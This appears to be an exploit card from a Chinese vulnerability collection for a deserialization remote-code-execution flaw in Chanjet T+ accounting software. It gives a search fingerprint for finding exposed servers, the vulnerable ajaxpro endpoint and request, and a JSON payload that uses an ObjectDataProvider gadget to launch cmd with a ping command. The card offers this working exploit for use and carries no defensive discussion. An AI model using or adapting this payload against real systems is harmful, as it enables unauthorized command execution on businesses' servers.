# 畅捷通T+RRATableController,Ufida.T.DI.UIP.ashx反序列化RCE漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
"storeID":{
"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"MethodName":"Start",
"ObjectInstance":{
"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"StartInfo": {
"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"FileName":"cmd", "Arguments":"/c ping www.baidu.com"
```
- **预期**：200　|　—